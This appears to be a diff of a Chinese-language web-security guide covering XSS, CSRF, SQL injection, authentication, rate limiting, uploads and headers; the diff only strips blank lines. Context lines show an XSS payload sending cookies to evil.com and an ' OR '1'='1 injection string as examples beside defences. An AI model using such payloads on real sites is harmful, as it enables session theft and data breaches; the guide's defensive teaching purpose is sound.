@@ -26,21 +26,16 @@
 ### Step 3: 漏洞扫描
 
 ```bash
-
 # 依赖漏洞扫描
-
 npm audit
 pnpm audit
 
 # 自动化安全扫描
-
 npm install -g snyk
 snyk test
 
 # OWASP ZAP 扫描
-
 docker run -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:3000
-
 ```
 
 ### Step 4: 手动审查
@@ -59,7 +54,6 @@ docker run -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:3000
 
 // 攻击者注入恶意脚本
 const userInput = '<script>document.location="http://evil.com/?cookie="+document.cookie</script>';
-
 ```
 
 #### 防护措施
@@ -87,7 +81,6 @@ const securityHeaders = [
     value: "default-src 'self'; script-src 'self' 'unsafe-inline';"
   }
 ];
-
 ```
 
 ### 2. CSRF (跨站请求伪造)
@@ -112,7 +105,6 @@ export async function POST(req: Request) {
 
 // ✅ Good: SameSite Cookie
 Set-Cookie: session=xyz; SameSite=Strict; HttpOnly; Secure
-
 ```
 
 ### 3. SQL 注入
@@ -123,7 +115,6 @@ Set-Cookie: session=xyz; SameSite=Strict; HttpOnly; Secure
 
 -- 攻击者输入: ' OR '1'='1
 SELECT * FROM users WHERE email = '' OR '1'='1'
-
 ```
 
 #### 防护措施
@@ -140,7 +131,6 @@ const user = await prisma.user.findUnique({
 
 // ✅ Good: 使用 ORM
 // Prisma, Drizzle, TypeORM 等都防止 SQL 注入
-
 ```
 
 ### 4. 认证安全
@@ -186,7 +176,6 @@ async function logout(token: string) {
   blacklistedTokens.add(token);
   // 或使用 Redis 存储，设置 TTL
 }
-
 ```
 
 #### 密码安全
@@ -203,7 +192,6 @@ const hashedPassword = await bcrypt.hash(plainPassword, saltRounds);
 const isValid = await bcrypt.compare(inputPassword, hashedPassword);
 
 // ❌ Bad: 明文存储密码（永远不要这样做！）
-
 ```
 
 ### 5. 速率限制
@@ -234,7 +222,6 @@ export async function POST(req: Request) {
 
   // 处理请求
 }
-
 ```
 
 ### 6. 输入验证
@@ -271,7 +258,6 @@ export async function POST(req: Request) {
     }
   }
 }
-
 ```
 
 ### 7. 文件上传安全
@@ -319,7 +305,6 @@ export async function POST(req: Request) {
 
   return Response.json({ url: `/uploads/${safeName}` });
 }
-
 ```
 
 ## 安全头配置
@@ -374,7 +359,6 @@ module.exports = {
     ];
   },
 };
-
 ```
 
 ## 环境变量安全
@@ -392,7 +376,6 @@ API_KEY=sk-xxxxxxxxxxxxx
 DATABASE_URL=postgresql://user:password@localhost:5432/db
 JWT_SECRET=change-me
 API_KEY=your-api-key
-
 ```
 
 ```gitignore
@@ -403,7 +386,6 @@ API_KEY=your-api-key
 .env.local
 .env.production
 !.env.example
-
 ```
 
 ## 依赖安全管理
@@ -428,7 +410,6 @@ npm audit
 pnpm audit fix
 
 # 自动化：使用 Dependabot 或 Renovate
-
 ```
 
 ### GitHub Dependabot 配置
@@ -444,7 +425,6 @@ updates:
     schedule:
       interval: "weekly"
     open-pull-requests-limit: 10
-
 ```
 
 ## 安全检查清单
@@ -538,5 +518,4 @@ updates:
 - 24 小时内确认收到
 - 72 小时内提供初步评估
 - 修复后公开致谢
-
 ```
